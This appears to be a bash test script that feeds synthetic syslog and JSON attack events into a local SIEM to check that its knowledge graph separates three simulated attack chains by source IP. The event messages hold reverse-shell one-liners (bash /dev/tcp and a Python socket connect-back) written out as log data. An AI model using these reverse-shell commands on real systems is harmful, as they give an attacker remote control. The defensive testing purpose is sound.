#!/usr/bin/env bash
# Multi-IP Kill Chain Test
# Tests KG separation with 3 different attacker IPs

SYSLOG_HOST="${SIEM_HOST:-localhost}"
SYSLOG_PORT="${SIEM_SYSLOG_PORT:-5140}"
JSON_PORT="${SIEM_JSON_PORT:-5141}"

IP1="1.1.1.1"       # Cloudflare — Brisbane, AU
IP2="8.8.8.8"       # Google DNS — Ashburn, US
IP3="185.220.101.1" # Tor exit node — Germany

send_syslog() {
    printf '%s' "$1" | nc -q1 "${SYSLOG_HOST}" "${SYSLOG_PORT}"
}

send_json() {
    printf '%s' "$1" | nc -q1 "${SYSLOG_HOST}" "${JSON_PORT}"
}

echo "=== Attacker 1: ${IP1} (Cloudflare AU) ==="

send_syslog "CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=${IP1} spt=12345 dst=10.0.0.1 dpt=22 cnt=500"
sleep 0.5

send_syslog "<34>1 2026-01-01T01:00:01Z web-01 sshd 100 - - Failed password for root from ${IP1} port 22 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T01:00:03Z web-01 sshd 100 - - Failed password for root from ${IP1} port 22 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T01:01:00Z web-01 sshd 101 - - Accepted password for deploy from ${IP1} port 54321 ssh2"
sleep 0.5

send_json "{\"host\":\"web-01\",\"process\":\"bash\",\"message\":\"/bin/bash -i >& /dev/tcp/${IP1}/4444 0>&1\",\"level\":\"critical\",\"timestamp\":\"2026-01-01T01:03:00Z\"}"
sleep 1

echo "=== Attacker 2: ${IP2} (Google US) ==="

send_syslog "CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=${IP2} spt=9999 dst=10.0.0.2 dpt=3306 cnt=300"
sleep 0.5

send_syslog "<34>1 2026-01-01T02:00:01Z db-01 sshd 200 - - Failed password for admin from ${IP2} port 22 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T02:00:03Z db-01 sshd 200 - - Failed password for admin from ${IP2} port 22 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T02:01:00Z db-01 sshd 201 - - Accepted password for ubuntu from ${IP2} port 11111 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T02:02:00Z db-01 sudo 202 - - ubuntu ran COMMAND=/bin/bash as root uid=0 euid=0"
sleep 0.5

send_json "{\"host\":\"db-01\",\"process\":\"bash\",\"message\":\"/bin/bash -i >& /dev/tcp/${IP2}/9999 0>&1\",\"level\":\"critical\",\"timestamp\":\"2026-01-01T02:03:00Z\"}"
sleep 1

echo "=== Attacker 3: ${IP3} (Tor Exit DE) ==="

send_syslog "CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=${IP3} spt=4444 dst=10.0.0.3 dpt=80 cnt=1000"
sleep 0.5

send_syslog "<34>1 2026-01-01T03:00:01Z app-01 sshd 300 - - Failed password for root from ${IP3} port 22 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T03:00:03Z app-01 sshd 300 - - Failed password for root from ${IP3} port 22 ssh2"
sleep 0.5

send_syslog "<34>1 2026-01-01T03:01:00Z app-01 sshd 301 - - Accepted password for git from ${IP3} port 22222 ssh2"
sleep 0.5

send_json "{\"host\":\"app-01\",\"process\":\"python3\",\"message\":\"import socket,subprocess,os;s=socket.socket();s.connect((\\\"${IP3}\\\",4444))\",\"level\":\"critical\",\"timestamp\":\"2026-01-01T03:03:00Z\"}"

echo ""
echo "Done. 3 attack chains sent from 3 different IPs."
echo "Go to Knowledge Graph tab and click Refresh."
echo "You should see 3 separate subgraph panels:"
echo "  1.1.1.1       → Brisbane, AU"
echo "  8.8.8.8       → Ashburn, US"
echo "  185.220.101.1 → Germany (Tor)"
